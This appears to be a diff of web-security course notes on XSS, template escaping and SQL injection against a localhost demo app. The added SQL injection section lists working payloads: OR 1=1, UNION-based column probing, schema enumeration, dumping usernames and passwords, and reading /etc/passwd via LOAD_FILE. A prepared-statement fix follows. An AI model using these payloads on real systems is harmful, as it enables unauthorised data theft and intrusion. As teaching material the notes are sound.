@@ -1,4 +1,4 @@
-_'Focus on attacks to know how to protect'_
+>_'Focus on attacks to know how to protect'_
 
 What is security?
 - Confidentiality - no stolen data
@@ -6,6 +6,7 @@ What is security?
 - Availability - no DoS
 
 http://www.owasp.org - security wiki/community
+
 https://www.exploit-db.com/ - attack wiki/community
 
 # Client Side
@@ -21,8 +22,9 @@ Whole HTTP request including headers, imported files, file names etc.
 DEMO: if Apache access logs are publicly visible, then it is possible to inject JS via User-Agent
 
 ## Input Data Validation
-Client-side - usability
-Server-side - validation
+1. Client-side - usability
+2. Server-side - validation
+
 Invalid input means:
 - insufficient client-side check or
 - hacker
@@ -62,12 +64,12 @@ http://localhost:8080/rest/partner
 What if partner can change his name?
 http://localhost:8080/rest/partner?name=abc
 
-#### I use well-known templating framework and it will do the work
+#### "I use well-known templating framework and it will do the work"
 Spring Boot App + Freemarker
 
 http://freemarker.org/docs/pgui_config_outputformatsautoesc.html
 
-_By default, templates have "undefined" output format associated, which does no escaping, and in general gives the behavior that you would expect from a template engine that doesn't care about output formats and escaping._
+> _By default, templates have "undefined" output format associated, which does no escaping, and in general gives the behavior that you would expect from a template engine that doesn't care about output formats and escaping._
 
 ```java
 configuration.setOutputFormat(HTMLOutputFormat.INSTANCE);
@@ -91,7 +93,55 @@ x-content-type-options: nosniff
 ## Business logic flaws
 ## Google hacking
 ## File handling
+
 ## SQL injection
 
+### DEMO: SELECT
 http://localhost:8080/sql/search
-' OR 1=1
+- ' OR 1=1
+- ' OR 1=1 #
+
+#### How many columns there are?
+- ' UNION SELECT 1 #
+- ' UNION SELECT 1,2 #
+- etc.
+
+#### Useful info
+```sql
+SELECT DATABASE(), USER(), SERVER()
+```
+- ' UNION SELECT 1, USER(), 3 #
+
+#### Database structure
+E.g. MySQL
+```sql
+SELECT * FROM INFORMATION_SCHEMA.COLUMNS
+```
+' UNION SELECT 1, CONCAT(TABLE_SCHEMA,',',TABLE_NAME,',',COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS #
+
+#### User table
+' UNION SELECT 1, CONCAT(USERNAME,',',PASSWORD), 3 FROM USERS #
+
+#### Read files
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 #
+
+#### FIX - Prepared statements
+
+```java
+  PreparedStatement updateSales = con.prepareStatement(
+      "SELECT * FROM products WHERE name like ?");
+  updateSales.setString(1, "%"+query+"%");
+```
+
+What about searching: `%`
+
+### DEMO: UPDATE
+
+### DEMO: ORDER BY
+
+
+
+### DEMO: BLIND
+
+
+### DEMO: console
